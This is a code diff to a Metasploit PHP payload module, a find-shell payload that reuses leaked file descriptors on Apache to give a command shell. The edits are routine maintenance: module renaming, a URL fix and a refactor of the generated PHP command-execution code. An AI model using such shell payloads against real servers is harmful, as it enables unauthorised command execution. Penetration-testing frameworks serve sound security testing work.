@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -10,7 +10,9 @@ require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 require 'msf/core/handler/find_shell'
 
-module Metasploit3
+module MetasploitModule
+
+  CachedSize = :dynamic
 
   include Msf::Payload::Single
   include Msf::Payload::Php
@@ -33,7 +35,7 @@ module Metasploit3
         Apache but it might work on other web servers
         that leak file descriptors to child processes.
         },
-      'Author'        => [ 'egypt <egypt@metasploit.com>' ],
+      'Author'        => [ 'egypt' ],
       'License'       => BSD_LICENSE,
       'Platform'      => 'php',
       'Handler'       => Msf::Handler::FindShell,
@@ -48,13 +50,12 @@ module Metasploit3
     var_fd  = '$' + Rex::Text.rand_text_alpha(rand(4) + 6)
     var_out = '$' + Rex::Text.rand_text_alpha(rand(4) + 6)
     shell = <<END_OF_PHP_CODE
-error_reporting(0);
+#{php_preamble}
 print("<html><body>");
 flush();
 
 function mysystem(#{var_cmd}){
-  #{php_preamble()}
-  #{php_system_block({:cmd_varname=>var_cmd, :output_varname => var_out})}
+  #{php_system_block(cmd_varname: var_cmd, output_varname: var_out)}
   return #{var_out};
 }
 
